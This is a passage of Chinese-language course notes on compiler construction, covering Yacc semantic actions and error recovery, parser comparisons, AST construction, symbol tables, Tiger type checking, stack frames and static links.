语义动作形如 <code>$$ = $1 + $3</code></p><ul><li><code>$$</code> 表示和产生式头(LHS)相关的属性值</li><li><code>$i</code> 表示产生式体中第i个文法符号（终结符&#x2F;非终结符）的属性值</li></ul></li><li><p>消除二义性与解决冲突</p><ul><li>消除二义性：<ul><li>指定运算符优先级：先出现的优先</li><li>指定运算符结合律：<code>%left</code>（左结合，例如乘法加法） <code>%right</code>（右结合，例如一元运算符负号）</li></ul></li><li>冲突解决<ul><li>规约-规约冲突：先出现的产生式优先采用</li><li>移进-规约冲突：移进优先采用</li></ul></li><li>更通用的方法：通过改写文法，可以在消除冲突的同时减少二义性</li></ul></li></ol><h3 id="错误恢复（续）"><a href="#错误恢复（续）" class="headerlink" title="错误恢复（续）"></a>错误恢复（续）</h3><p>动机：一次性报告所有错误，而非遇到第一个就停下。</p><ul><li>局部错误恢复：调整Parse过程的栈，使其恢复到正常从而继续进行Parsing</li><li>全局错误恢复：删除&#x2F;插入尽可能少的字符，使得源字符串成为合法的字符串</li></ul><ol><li><p>局部错误恢复<br> Yacc中的一个方法：使用特殊的<code>error</code>符号（终结符）控制恢复过程。<br> 例如：</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exp -&gt; ( error )</span><br><span class="line">exp -&gt; error ; exp</span><br></pre></td></tr></table></figure><p> 于是通过这样的产生式，我们可以把错误的影响范围控制在右括号处&#x2F;分号处。如果语法处理时遇到错误，可以一路跳过直到右括号和分号，然后继续处理。<br> 分号、右括号这样的符号就被叫做synchronizing token.</p><p> 当语法分析器遇到错误时：</p><ul><li>不断弹出栈中状态，直到栈顶状态包含项 $ A \rightarrow \bullet error\ \alpha$</li><li>分析器将error移入栈中</li><li>如果α为空，分析器直接执行归约，并调用相关的语义动作；否则跳过一些符号，找到可以归约为α的串为止</li></ul><p> 流程示例：<br> <img src="/compiler-construction-principles/local-recovery.png" alt="local error recovery" loading="lazy"></p></li><li><p>*全局错误恢复<br> <strong>不要求掌握。</strong><br> Burke-Fisher 错误恢复: 对于在发生错误处之前的K个token，每一处都允许插入&#x2F;删除&#x2F;修改一个token，直到修复成功。<br> 优势：</p><ul><li>不引入新产生式，不改变文法</li><li>也不改变分析表</li></ul><p> 如何判定修复是否成功：修复后，在报告错误处继续Parsing直到下一个错误发生的距离最长（一般来说，修复后能从本来由于错误卡住的地方继续前进4个token就算成功了）。</p><p> 实现：维护K个token前的旧栈，以及K个token组成的队列。遇到错误后基于旧栈和增删改后的token队列（不一定是K个了）试图parse. 尝试不同的增删改方案直到修复成功：<br> <img src="/compiler-construction-principles/burke-fisher.png" alt="burke-fisher" loading="lazy"></p><p> 语义动作需要延迟到进入旧栈中（进入旧栈说明在解析流程中已经确定了）再进行</p><ul><li>否则如果遇到错误，错误恢复发现原来的parsing方式不对时，文法符号的属性已经按照错误的方式运算了，回天乏术。</li></ul></li></ol><h2 id="语法分析小结：文法对比"><a href="#语法分析小结：文法对比" class="headerlink" title="语法分析小结：文法对比"></a>语法分析小结：文法对比</h2><h3 id="SLR-与-LR-1"><a href="#SLR-与-LR-1" class="headerlink" title="SLR 与 LR(1)"></a>SLR 与 LR(1)</h3><table><thead><tr><th></th><th>SLR</th><th>LR(1)</th></tr></thead><tbody><tr><td>移   进</td><td>$ A\rightarrow \alpha \bullet a \beta \in I_i \\ \text{Goto}(I_i,a)&#x3D;I_j \\ \text{Action}[i,a]&#x3D;s_j $</td><td>$ A\rightarrow \alpha \bullet a \beta \in I_i \\ \text{Goto}(I_i,a)&#x3D;I_j \\ \text{Action}[i,a]&#x3D;s_j $</td></tr><tr><td>—</td><td>—</td><td>—</td></tr><tr><td>规   约</td><td>$ A\rightarrow \alpha \bullet \in I_i \\ \alpha \in \text{Follow}(A) \\ \text{Action}[i,a]&#x3D;r_j$</td><td>$ A\rightarrow \alpha \bullet \in I_i \\ \text{Action}[i,a]&#x3D;r_j $</td></tr></tbody></table><p>可见唯一的区别就是SLR在规约时要求后继token是在Follow集里的。</p><h3 id="LL-1-与-LR-1"><a href="#LL-1-与-LR-1" class="headerlink" title="LL(1) 与 LR(1)"></a>LL(1) 与 LR(1)</h3><table><thead><tr><th></th><th>LR(1)</th><th>LL(1)</th></tr></thead><tbody><tr><td>建立分析树</td><td>自底而上</td><td>自顶而下</td></tr><tr><td>归约or推导</td><td>规范归约(最右推导的逆)</td><td>最左推导</td></tr><tr><td>分析表（行x列）</td><td>状态×文法符号，大</td><td>非终结符×终结符，小</td></tr><tr><td>分析栈</td><td>状态栈，信息更多</td><td>文法符号栈</td></tr></tbody></table><ul><li>LL(1): 对于多个可选产生式 $A\rightarrow \alpha_1|\alpha_2|…$ 向前看下一个输入根据First,Follow确定使用哪条产生式推导</li><li>LR(1): 对于多个可选产生式 $A\rightarrow \alpha,\ B\rightarrow \alpha,… $ 在识别出整个$\alpha$后，再往前看1个符号，然后确定使用哪条产生式归约</li></ul><h3 id="LL-1-LR-1-SLR"><a href="#LL-1-LR-1-SLR" class="headerlink" title="LL(1) LR(1) SLR"></a>LL(1) LR(1) SLR</h3><p><img src="/compiler-construction-principles/grammar-compare.png" alt="grammar-compare" loading="lazy"></p><h2 id="Part-7-抽象语法"><a href="#Part-7-抽象语法" class="headerlink" title="Part 7: 抽象语法"></a>Part 7: 抽象语法</h2><p>编程语言 &#x3D; 语法（识别一个合法的程序） + 语义（这个合法的程序对应的实际行为）</p><ul><li>语法：已经在之前章节讨论过。</li><li>语义：<ul><li>操作语义：如何执行程序？</li><li><del>公理语义：可以证明程序的那些性质？</del> （该部分不在本课讨论）</li><li>指称语义：程序是做什么的？</li></ul></li></ul><h3 id="属性文法Attribute-Grammar"><a href="#属性文法Attribute-Grammar" class="headerlink" title="属性文法Attribute Grammar"></a>属性文法Attribute Grammar</h3><p>属性文法&#x3D;<strong>上下文无关文法+属性+属性计算规则</strong></p><ul><li>属性:&#x3D; 描述文法符号的语义特征，比如表达式E的值可以记为E.val</li><li>属性计算规则(语义规则):&#x3D; 与产生式相关联、反映文法符号属性之间关系的规则，比如在乘法表达式中左侧的E.val要如何计算<ul><li>仅表明属性间“抽象”关系，不涉及计算次序等具体实现细节</li></ul></li><li>应用：<ul><li>“推导类”：例如很多语言的<strong>编译期求值</strong></li><li>“生成类”：生成AST， 中间代码等</li><li>…</li></ul></li><li>实现：例如在先前章节中Yacc等Parser生成器的<strong>语义动作</strong></li></ul><h3 id="语义动作Semantic-Action"><a href="#语义动作Semantic-Action" class="headerlink" title="语义动作Semantic Action"></a>语义动作Semantic Action</h3><p>我们可以给产生式绑定一个语义动作，使得按照这个产生式规约时&#x2F;推导时完成特定操作。</p><p>每个token都可能有独属于自己的 <strong>语义值(Semantic Value)</strong> 。每种token的语义值类型可以不同，我们把A的语义值的类型称为“A的关联类型”。<br>例如对于产生式 $A\rightarrow B\ C\ D$</p><ul><li>语义动作返回值必须是<em>A的关联类型</em></li><li>这个值可以通过B C D各自的语义值进行运算得出</li></ul><p>例如通过如下语义动作可以在编译期直接evaluate表达式的值：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">E-&gt;E1 + T   &#123; E.val= E1.val + T.val &#125;</span><br><span class="line">E-&gt;E1 – T   &#123; E.val= E1.val - T.val &#125;</span><br><span class="line">E-&gt;T        &#123; E.val= T.val &#125;</span><br><span class="line">T-&gt;(E)      &#123; T.val= E.val &#125;</span><br><span class="line">T-&gt;num      &#123; T.val= num.val &#125;</span><br></pre></td></tr></table></figure><p>在递归下降法中，语义动作体现为每个符号对应的parsing函数。这里我们同时关心函数的<strong>返回值</strong>与<strong>副作用</strong>。<br>因此假设T和F两个token的关联类型都是<code>int</code>，对于表达式 $T\rightarrow T * F$ 可以如此实现语义动作：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a= T();</span><br><span class="line">eat(TIMES); <span class="comment">// &#x27;*&#x27;</span></span><br><span class="line"><span class="type">int</span> b= F();</span><br><span class="line"><span class="keyword">return</span> a*b;</span><br></pre></td></tr></table></figure><p>而对于Parser生成器来说，其实现方式有所不同，以Yacc为例：</p><ul><li>用一个栈储存语义值，这个栈和状态栈是同步的</li><li>当进行<strong>规约</strong>操作时，需要执行相应的语义动作（C语言实现）<ul><li>可能用到的值一定可以通过多次pop语义值栈获得（和状态栈pop同步）</li><li>pop完毕后运算得到的新值压入该栈（和状态栈压入新状态同步）</li></ul></li></ul><h3 id="抽象解析树APT"><a href="#抽象解析树APT" class="headerlink" title="抽象解析树APT"></a>抽象解析树APT</h3><p>APT &#x3D; Abstract Parse Tree 是语义动作的一种应用。</p><blockquote><p>⚠和抽象语法树(Abstract Syntax Tree)的区别请参阅<a href="https://stackoverflow.com/questions/5026517/whats-the-difference-between-parse-trees-and-abstract-syntax-trees-asts">https://stackoverflow.com/questions/5026517/whats-the-difference-between-parse-trees-and-abstract-syntax-trees-asts</a></p></blockquote><p>能否<strong>通过描述语义动作直接实现整个编译器</strong>？可以，但是难以维护，且必须保证这些语义值的计算顺序和Parsing顺序完全一致。</p><ul><li>考虑分离语法解析（Parsing）和语义动作：一个可行方案是Parsing得到树，而后遍历以进行语义相关的操作。</li></ul><p>我们可以很容易得到一棵树：叶节点对应输入的token，内部节点对应一个语法规则。这被称为<strong>concrete parse tree</strong>.<br><img src="/compiler-construction-principles/concrete-pt.png" alt="concrete-pt" loading="lazy"></p><ul><li>缺点：太“啰嗦”。例如括号相关产生式只是为了解析顺序正确才有的，没必要放进树里。</li></ul><h3 id="抽象语法树AST"><a href="#抽象语法树AST" class="headerlink" title="抽象语法树AST"></a>抽象语法树AST</h3><p>AST &#x3D; Abstract Syntax Tree<br>可以提供一个<em>干净的</em>（不包含Parsing的那些繁文缛节）接口用于后续编译流程的实现或优化（编译器后端）。</p><p>生成方式：用<strong>具体语法</strong>（Parser生成器能懂的）为<strong>抽象语法</strong>（我们想要的、更可读的）生成抽象语法树：<br><img src="/compiler-construction-principles/AST.png" alt="AST" loading="lazy"></p><p>实现：</p><ul><li>为每一个非终结符定义一个类型声明，用于表示其关联类型。</li><li>产生式统一放进一个union（如果是Rust就是Option直接解决，<del>C语言太坏了</del>）里，每一个产生式就是union里的一个结构体，这个结构体用于储存其子节点：<br><img src="/compiler-construction-principles/AST-def.png" alt="AST definition" loading="lazy"></li><li>为每个产生式定义一个函数，除了计算需要的语义值返回以外，还将申请空间、分配新的树节点并设置好其子节点：<br><img src="/compiler-construction-principles/AST-impl.png" alt="AST implementation" loading="lazy"></li><li>以Yacc为例，把这些函数放入对应产生式的语义动作块中即可在规约时自动调用。随着Parsing的逐步推进，每次规约都可以产生一个新的内部节点，最终逐步构建出整颗AST。</li></ul><p>此外，通过遍历AST还能做很多：</p><ul><li>通过一些“变形”缩小树的规模，减少最终代码的大小</li><li>通过一些“变形”优化树的结构，提高最终代码的性能</li><li>代码内联优化</li><li>静态分析，编译期推导值</li><li>类型系统检查等安全检查</li><li>翻译到中间表示，虽然<strong>AST也常被视作一种“中间表示”</strong></li></ul><h3 id="位置Position"><a href="#位置Position" class="headerlink" title="位置Position"></a>位置Position</h3><p>在one-pass编译器中，词法分析、语法分析、语义分析是同步进行的。而错误发生时，<strong>词法分析器lexer</strong>的位置可以用来作为错误发生位置的合理估计反馈给用户。所以，lexer存有一个全局变量维护当前位置信息。</p><p>然而，对于使用AST的编译器，词法分析结束后才开始语法分析，因此这是不可行的。<br>解决方案：AST每个节点记录自己在源文件中的<strong>位置</strong>，标记自己是具体哪几个字符派生而来的。</p><ul><li><p>lexer把每个token的起始位置、结束位置传递给parser</p></li><li><p>parser维护<em>位置栈</em>与<em>语义值栈</em>，这样语义操作就知道位置信息了</p><ul><li>不是所有的Parser生成器都可以做到这一点：例如Bison可以但Yacc不行</li><li>对于Yacc等无法直接实现的，可以引入新的非终结符pos（其语义值包含需要的位置信息）并改写文法。例如可以如此改写PLUS表达式以利用位置信息：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">%&#123; extern A_OpExp(A_exp, A_binop, A_exp, position); %&#125;</span><br><span class="line"></span><br><span class="line">%union &#123;</span><br><span class="line">    int num;</span><br><span class="line">    string id;</span><br><span class="line">    position pos;</span><br><span class="line">    ...</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">%type &lt;pos&gt; pos</span><br><span class="line"></span><br><span class="line">pos: &#123; $$ = EM_tokpos; &#125;</span><br><span class="line"></span><br><span class="line">exp: exp PLUS pos exp &#123; $$ = A_OpExp($1, A_plus, $4, $3); &#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="Part-8-语义分析"><a href="#Part-8-语义分析" class="headerlink" title="Part 8: 语义分析"></a>Part 8: 语义分析</h2><p>注意到：上述的属性文法等内容只适用于上下文无关文法CFG.<br>然而CFG有很多不足，例如不可能完成：</p><ul><li>检查数组引用的维度是否匹配</li><li>检查数组越界</li><li>确定变量应储存于栈上还是堆上</li><li>…</li></ul><p>这是因为，这些检查和值有关（涉及语义），而非语法本身。因此我们需要通过检查、遍历 <strong>程序表示(Program Representation)</strong> 来完成 <strong>（广义的）语义分析</strong>。<br>常用的程序表示：</p><ul><li>abstract syntax tree (AST)</li><li>control flow graph (CFG)</li><li>programdependence graph (PDG)</li><li>valueflowgraph (VFG)</li><li>single static assignment (SSA)</li></ul><p>然后我们就可以：</p><ul><li>类型检查</li><li>代码生成</li><li>去除dead code</li><li>寄存器分配</li><li>…</li></ul><p>本课重点关注的（狭义的）语义分析指的是通过检查AST获知程序的静态属性，包括：</p><ul><li>作用域(Scope)与变量可见性</li><li>变量、函数、表达式的类型<br>以及将AST转为中间代码(Intermediate Code)</li></ul><h3 id="符号表Symbol-Table"><a href="#符号表Symbol-Table" class="headerlink" title="符号表Symbol Table"></a>符号表Symbol Table</h3><p>Binding:&#x3D; 把类型、值等信息绑定到一个identifier上<br>Environment:&#x3D; 一些绑定的集合，体现了程序当前环境下已声明的一些变量&#x2F;函数&#x2F;…</p><p><strong>符号表</strong>就是Environment的一种实现方式。我们在遍历AST的过程中可以维护一个符号表用于语义分析。<br>符号表中的重要组成部分就是各个局部变量及其作用域。当退出作用域时，自然就需要丢弃内部的一些binding.<br>变量在scope内重新定义时需要覆盖（屏蔽）掉更大作用域的，退出时则还原。<br>因此可见我们需要为符号表实现的接口包括：</p><ul><li>insert: 将名称绑定到相关信息(type, value, …), 且将覆盖已有的绑定关系（如果存在）</li><li>lookup: 用名称查找信息</li><li>beginScope: 进入作用域</li><li>endScope: 退出作用域，将符号表恢复到进入之前的状态</li></ul><p>在Java等语言中，可能有多个环境同时活跃（对应不同的module, class等），他们都需要一个符号表。这被称为多符号表。</p><ul><li>符号表的实现：<br>绑定时，如果遇到了符号已经存在的情况，有两种策略：<ul><li>Imperative Style: 直接覆盖旧的绑定，这样就不可能lookup到旧的信息。当这个新的绑定不再有效时，需要复原旧的绑定。<ul><li>如何快速lookup且支持删除和复原(restore): 使用哈希表套链表储存每对binding. 我们称哈希表中的元素为bucket.</li><li>insert: 直接插入对应bucket的链表头。如果已经存在，由于这使得新的binding关系更靠前，这样做可以成功覆盖。</li><li>restore: 对应bucket的链表头弹出头部的一些元素。</li><li>我们会发现需要维护一些必要的额外信息（比如scope变化时应该要弹出几次）。</li></ul></li><li>Functional Style: 永远保留老的，只是查询时做一些额外处理（可以理解为只是renaming）。这样还原更简单。<ul><li>直接使用BST（红黑树等）实现查找。</li><li>可以使用可持久化数据结构完成删除、复原等操作，进一步降低单次操作的空间复杂度，非常方便。</li></ul></li></ul></li></ul><p>两种方法均可使用。</p><h3 id="Tiger编译器符号相关的实现"><a href="#Tiger编译器符号相关的实现" class="headerlink" title="Tiger编译器符号相关的实现"></a>Tiger编译器符号相关的实现</h3><p>在哈希表中的链表进行lookup时，不断进行字符串比较是很耗时的。</p><ul><li>解决办法：使用新的数据结构将符号对象关联到一个整数上（哈希值）</li></ul><p>Tiger编译器的environment是destructive-update的。也就是说，有两个函数：</p><ul><li><code>S_beginScope</code>: 记下当前符号表的状态</li><li><code>S_endScope</code>: 恢复到最近的、还未被恢复的<code>S_beginScope</code>记下的状态</li></ul><p>我们引入一个 <strong>辅助栈(Auxiliary stack)</strong> 来维护上文提到的必要的额外信息:</p><ul><li>符号入栈时，会将binding联动地插入对应bucket的链表头</li><li>弹出栈顶符号时，对应bucket的链表头也会联动地被移除</li><li>beginScope: 压入一个特殊标记到辅助栈中</li><li>endScope: 一直弹出符号直到弹出了一个特殊标记<ul><li>可以由此标记推断：此次因为退出scope引发的restore操作可以就此结束</li></ul></li></ul><h3 id="类型检查"><a href="#类型检查" class="headerlink" title="类型检查"></a>类型检查</h3><ol><li><p>类型系统</p><p> 类型限定了变量的取值范围以及部分运算规则。<br> 可以大致把编程语言分为：</p><ul><li>类型化的(typed): C&#x2F;C++ Java Go</li><li>非类型化的(untyped): LISP JavaScript<ul><li>注意：不是没有类型，而是类型可变</li></ul></li></ul><p> 类型系统作用：</p><ul><li>提高开发效率（高层抽象&amp;指称语义）</li><li>提高运行性能（指导编译优化）</li><li>提高安全性（内存安全等）</li><li>…</li></ul><blockquote><p>事实上，可以理解为每引入一种类型就能<strong>完全</strong>消除某一类特定错误。</p></blockquote><p> 形式化的类型系统可用于数学领域，参见Coq以及<a href="https://leanprover-community.github.io/">LEAN</a></p></li><li><p>Tiger的类型系统<br> 包含：</p><ul><li>原始类型(primitive type): <code>int</code>和<code>string</code></li><li>构造类型(constructed type): <code>record</code>（类似结构体） 和<code>array</code></li></ul><p> 根据不同的判别法，<strong>类型等价</strong>这一关系分为：</p><ul><li>Name equivalence (NE): 必须声明是同一个类型才是同一类型</li><li>Structure equivalence (SE): “长得一样”（内部结构一样）就是同一类型</li></ul><p> 显然前者被广泛采用，Tiger语言也不例外。<br> Tiger存在两个独立的命名空间，不同命名空间的同名identifier不会互相遮蔽(hide)对方：</p><ul><li>Types</li><li>Functions and variables</li></ul></li><li><p>Tiger的类型检查</p><p>Tiger的语义分析需要两个环境：</p><ul><li><p><code>Type</code>: 把类型符号映射到其表示的具体类型对应的数据结构</p><ul><li>初始时包含primitive type对应的映射 int $\mapsto$ Ty_int, string $\mapsto$ Ty_string</li></ul></li><li><p><code>Value</code>: 把变量名映射到具体类型，把函数名映射到(参数类型, 返回值类型)（也就是函数签名）</p><ul><li>初始时包含Tiger中预定义的一些函数定义</li></ul></li></ul><p><code>semant</code> 模块包含类型检查等语义分析相关操作。类型检查分为两部分：</p><ul><li>Type-checking expressions<ul><li><code>transExp</code>可以在给定的两个环境下将输入的表达式标记上type（如果发现非法则报错）</li></ul></li><li>Type-checking declarations<ul><li>在Tiger语言中声明只可能在<code>let</code>语句中出现</li><li>变量声明：如果提供了变量类型，则检查初始化表达式类型是否匹配；否则直接通过初始化表达式类型获得变量类型</li><li>类型声明：<strong>递归地</strong>获取类型别名对应的实际类型。<ul><li>Q: 如何处理递归声明 <code>type list = &#123;first: int, rest: list&#125;</code>？A: 不使用one-pass而是two-pass: pass#1: 记录声明头部（左侧）放入环境；pass#2: 完成</li><li>不允许类型的直接循环引用(<code>type a=b;type b=a</code>)：必须通过record或array完成(<code>type a=b;type b=&#123;i:a&#125;</code>)</li></ul></li><li>函数声明：检查形参、返回值与函数体<ul><li>Q: 如何处理递归声明？A: 不使用one-pass而是two-pass: pass#1: 记录函数声明（签名）放入环境；pass#2: 处理函数题</li></ul></li></ul></li></ul></li></ol><hr><blockquote><p><strong>!!!以上所有内容为期中考覆盖范围</strong></p></blockquote><hr><h2 id="Part-9-活动记录Activation-Record"><a href="#Part-9-活动记录Activation-Record" class="headerlink" title="Part 9: 活动记录Activation Record"></a>Part 9: 活动记录Activation Record</h2><blockquote><p>其实Activation Record就是栈帧Stack Frame</p></blockquote><h3 id="Why-How"><a href="#Why-How" class="headerlink" title="Why &amp; How"></a>Why &amp; How</h3><p>编译过程需要区分代码（由PC寄存器指向）与数据。</p><ul><li>高地址向低地址增长：栈Stack</li><li>低地址向高地址增长：堆Heap</li><li>低地址：静态数据（代码+全局变量）</li></ul><p>递归&#x2F;调用子函数时需要在<strong>栈帧</strong>存放当前函数的上下文信息：</p><ul><li>调用的参数</li><li>局部变量</li><li>子函数执行完毕后的返回地址</li><li>…</li></ul><p>主要寄存器：</p><ol><li>Frame Pointer&#x2F;Base Pointer 基址寄存器</li><li>Stack Pointer 栈顶寄存器<br>例如f()中调用g():<br><img src="/compiler-construction-principles/ar-entering.png" alt="ar-entering" loading="lazy"><br>然后g()执行完毕返回f()继续执行：<br><img src="/compiler-construction-principles/ar-exiting.png" alt="ar-exiting" loading="lazy"></li></ol><blockquote><p>所以子函数是通过基址寄存器向高地址，越过返回地址获取自己的参数。</p></blockquote><p>思考：为什么不开启优化的时候如下的写法可以“返回”值？</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">foo</span><span class="params">(<span class="type">int</span> num)</span> </span>&#123;</span><br><span class="line"> <span class="type">int</span> var=num+<span class="number">1</span>;</span><br><span class="line"> <span class="comment">// no return!</span></span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"> <span class="type">int</span> a = <span class="built_in">foo</span>(<span class="number">114514</span>);</span><br><span class="line"> cout&lt;&lt; a &lt;&lt;endl; <span class="comment">// 114515</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>答案：如果有return语句，返回值会被push到栈帧。<br>但是这里并没有return语句，所以本来是返回值的位置就被栈帧里最后一个（也是唯一一个）局部变量<code>var</code>给“冒充”了。<br>当然这是UB, 不能保证这种行为的可重复性（例如开启高优化级别时，这个现象很容易就被优化坏了，只留下一个0）。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>基址寄存器&#x3D;FP<br>栈顶寄存器&#x3D;SP<br>如果f调用g(a1, a2, …):</p><ul><li>SP指向第一个参数a1</li><li>SP减去栈帧大小（向低地址增长）得到FP<br>进入g:</li><li>将旧的FP压入栈</li><li>令新的FP&#x3D;SP</li><li>g可以基于FP向高地址获取参数，或向低地址压入&#x2F;查询局部变量<br>从g退出：</li><li>返回值拷贝至特殊寄存器</li><li>SP&#x3D;FP（释放g的栈帧）</li><li>从栈上取回旧的FP值到FP中</li></ul><h2 id="Part-10-寄存器与变量"><a href="#Part-10-寄存器与变量" class="headerlink" title="Part 10: 寄存器与变量"></a>Part 10: 寄存器与变量</h2><p>Intuition: 内存太慢了，使用层次化的储存提高速度(Regs-L1-L2-L3-Mem-Disks…)<br>所以其实并不是所有参数&#x2F;局部变量都要放栈上，有时直接通过寄存器传参&#x2F;保存局部变量即可。<br>Tiger语言：默认按值传递，函数内部改变不影响外部值<br><em>注：函数&#x2F;过程这两个词可以混用，是一个含义。</em></p><h3 id="局部变量"><a href="#局部变量" class="headerlink" title="局部变量"></a>局部变量</h3><p>调用函数需要保护现场：因为寄存器的值可能会被子函数改变，返回时“现场已经被破坏”。为此部分寄存器的值需要在栈上进行备份。分为以下两种：</p><ul><li>Caller-save: 例如临时寄存器，调用者如果用到则需要自己保存，子函数可以任意修改</li><li>Callee-save: 例如FP&#x2F;SP, 由子函数负责保存与恢复（进入子函数时push到栈，退出时从栈里pop），调用者无需关心</li></ul><h3 id="参数传递"><a href="#参数传递" class="headerlink" title="参数传递"></a>参数传递</h3><p>函数调用传参：大部分现代编译器对于前几个参数直接通过寄存器传递，多余的则仍然通过栈完成传递。<br>但是物理寄存器的数量是有限的：假设有如下调用链f(x)-&gt;g(y)-&gt;h(z), 如果所有函数都通过寄存器<code>r1</code>接收参数，则f调用g(y)时要备份<code>r1</code>，再将<code>r1</code>设为要传给g的参数y.<br>因此，每个函数都要将<code>r1</code>在栈上备份，带来额外的内存traffic。<br>优化策略：</p><ul><li>从变量生命周期入手：如果寄存器对应的变量&#x2F;参数在当前函数不再使用，子函数覆盖了自然也无妨</li><li>全局寄存器分配策略：每个函数使用不同的一组寄存器传参</li><li>优化叶过程(Leaf Procedure)：如果某函数不调用任何其他过程，自然也不需要为（不存在的）子过程备份传入的参数</li><li>寄存器窗口Register Windows: 每次调用函数时，尽可能利用尚未用到的寄存器，然后为子函数分配新的一套可用的寄存器（SPARC采用该策略）</li></ul><h3 id="返回值与返回地址"><a href="#返回值与返回地址" class="headerlink" title="返回值与返回地址"></a>返回值与返回地址</h3><ul><li><p>返回地址:<br>Tl;DR: 函数调用<code>call</code>指令地址为a，则函数调用完毕应返回至地址a+1<br>现代机器基本将该地址保存在一个指定(designated)寄存器中。非叶过程需要在调用时把该值写入栈上，叶过程则不必。</p></li><li><p>返回值：</p><ul><li>如果可以则放置在指定寄存器中（例如X86-64使用<code>rax</code>）。</li><li>如果不可以（如：返回对象太大），一般来说调用者会在自己栈帧开一个临时空间，然后将地址作为一个隐藏的参数传递给被调用函数。这样被调用方可以直接在这个空间上储存返回值，最后用寄存器（比如<code>eax</code>&#x2F;<code>rax</code>）把返回值所在地址告诉调用者。</li></ul></li></ul><hr><p>关于局部变量、表达式中间值如何尽可能地利用寄存器储存，尽量减少内存traffic，以后会在<em>寄存器分配</em>部分详细阐述。</p><h3 id="Frame-Resident-Variables"><a href="#Frame-Resident-Variables" class="headerlink" title="Frame-Resident Variables"></a>Frame-Resident Variables</h3><p>寄存器并非万能：有时，在栈上分配空间（实体化）是不可避免的。例如：</p><ul><li>对象过大，无法放在寄存器中</li><li>数组对象，需要通过地址偏移访问</li><li>寄存器被特殊需要，例如上文提到可能用于传参</li><li>太多中间值&#x2F;局部变量，有限的寄存器放不下<ul><li>称为 <strong>“Spill”</strong> 了, 在寄存器分配部分会展开讨论</li></ul></li><li>变量 <strong>“逃逸(escape)”</strong> 了（也就是脱离了当前scope&#x2F;无法确定变量有效的生命周期）：<ul><li>引用传参：需要内存地址（虽然对于现代语言经过优化并不总是需要一个地址）</li><li>显式地取变量地址（C语言等）</li><li>被嵌套函数访问（Tiger语言不需要考虑）</li></ul></li></ul><p>这些变量就是 <em>frame-resident</em> 的，也就是它们不得不被分配在栈帧上。</p><h2 id="Part-11-块结构Block-Structure"><a href="#Part-11-块结构Block-Structure" class="headerlink" title="Part 11: 块结构Block Structure"></a>Part 11: 块结构Block Structure</h2><p>Intuition: 在允许函数嵌套定义的语言（比如Tiger）中，内部函数可能使用外部函数中的局部变量。<br><img src="/compiler-construction-principles/nested-funcs.png" alt="nested-funcs" loading="lazy"><br>变量可以通过FP访问（因为定义的变量内存地址在编译时未知，<strong>但相对当前函数的FP偏移值(offset)是已知的</strong>）。</p><p>在编译时，如何使得内部函数访问非局部定义的外部变量呢？有以下几种方法：</p><ul><li><strong>静态链接Static Link</strong>: 当内部函数<code>g</code>被调用时，调用者<code>f</code>传入一个指针指向<code>f</code>的栈帧（或者说活动记录）<ul><li>这种情况下，我们说”<code>f</code> statically encloses <code>g</code>“</li><li>如果多次嵌套，嵌套次数为<code>N</code>，这些指针会构成一个长为<code>N</code>的单向链表串联起栈帧</li><li>每个函数记录自己的嵌套深度<code>n</code></li><li>如果访问了在深度<code>m</code>的变量，只需沿着该链向上<code>n-m</code>次就可以找到该变量所在的栈帧</li><li>优缺点：Overhead小，但是因为要通过链表向上经过多层速度较慢</li><li><img src="/compiler-construction-principles/static-link-nested.png" alt="static-link-nested" loading="lazy"></li><li><strong>注意：有时<code>f</code>中嵌套的函数<code>g</code>不直接引用外部变量，而更里面的函数<code>h</code>可能才会；这时<code>h</code>的static link可以越过<code>g</code></strong></li></ul></li><li>Lamda lifting: 从最深的一层叶过程开始，把所有<code>g(a1)</code>用到的外部变量<code>o1</code> <code>o2</code>改写为真正传入的参数，于是变为<code>g(o1, o2, a1)</code>. 如此逐渐向上改写每一层即可。<br><img src="/compiler-construction-principles/lambda-lifting.png" alt="lambda-lifting" loading="lazy"></li><li>Display数组：一个全局数组，记录当前每个嵌套深度<code>i</code>对应的栈帧地址。这样不需要经过链表即可直接找到变量对应的栈帧。</li></ul><h2 id="Part-12-Tiger语言：一个例子"><a href="#Part-12-Tiger语言：一个例子" class="headerlink" title="Part 12: Tiger语言：一个例子"></a>Part 12: Tiger语言：一个例子</h2><h3 id="Tiger语言的栈帧布局-Layout"><a href="#Tiger语言的栈帧布局-Layout" class="headerlink" title="Tiger语言的栈帧布局(Layout)"></a>Tiger语言的栈帧布局(Layout)</h3><p><img src="/compiler-construction-principles/layout.png" alt="layout" loading="lazy"></p><ul><li>incoming parameters: 调用者传入</li><li>return address: 返回<code>CALL</code>指令</li><li>local variables: 部分必须在栈帧中放置的局部变量</li><li>saved registers: 该函数保存的一些寄存器值，为其他用途腾出寄存器</li><li>out-going arguments: 